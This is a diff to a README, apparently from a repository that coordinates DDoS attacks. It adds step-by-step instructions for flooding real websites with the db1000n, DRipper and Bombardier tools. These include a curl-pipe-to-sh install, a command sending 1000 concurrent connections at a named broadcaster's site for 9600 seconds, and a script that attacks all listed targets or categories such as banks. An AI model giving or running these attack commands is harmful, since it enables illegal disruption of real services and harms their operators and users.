@@ -52,22 +52,40 @@ You can check the availability of target resources using these websites:
 
 ## DDoS Tools
 
-### Docker (single-website attack)
+### [DB1000N](https://github.com/Arriven/db1000n)
+
+**Shell-way (simplest)**
+
+1. Run `curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | sh`
+2. Run `./db1000n`
+
+> See docs for other installation options.
+
+### [DRipper](https://github.com/palahsu/DDoS-Ripper)
+
+1. [Install python3](https://www.python.org/downloads/)
+2. Run `git clone https://github.com/palahsu/DDoS-Ripper`
+3. Run `python3 DRipper.py -s {IP} -p {PORT} -t 135` and put an IP that you want to attack
+
+### [Bombardier](https://github.com/codesenberg/bombardier) (Docker)
+
+**Installation (the simplest way)**
 
 1. Install [Docker Desktop](https://www.docker.com/products/docker-desktop)
 2. Open Terminal
-3. Run `docker run -ti --rm alpine/bombardier -c 1000 -d 9600s -l https://www.1tv.com/` (change URL to the one you want to attack)
+
+**Single-target attack**
+
+1. Run `docker run -ti --rm alpine/bombardier -c 1000 -d 9600s -l https://www.1tv.com/` (change URL to the one you want to attack)
 
 > See [Bombardier docs](https://github.com/codesenberg/bombardier) for more options
 
-### Docker (multiple websites)
+**Multi-target attack**
 
-1. Install [Docker Desktop](https://www.docker.com/products/docker-desktop)
-2. Open Terminal
-3. Download `bombardier.sh`
-4. Run `sudo chmod +x bombardier.sh`
-5. Run `./bombardier.sh` to attack all targets
-6. Run `./bombardier.sh banks` to attack specific category targets (see [targets](./targets))
+1. Download `bombardier.sh`
+2. Run `sudo chmod +x bombardier.sh`
+3. Run `./bombardier.sh` to attack all targets
+4. Run `./bombardier.sh banks` to attack specific category targets (see [targets](./targets))
 
 ## Browser-based DDoS
 
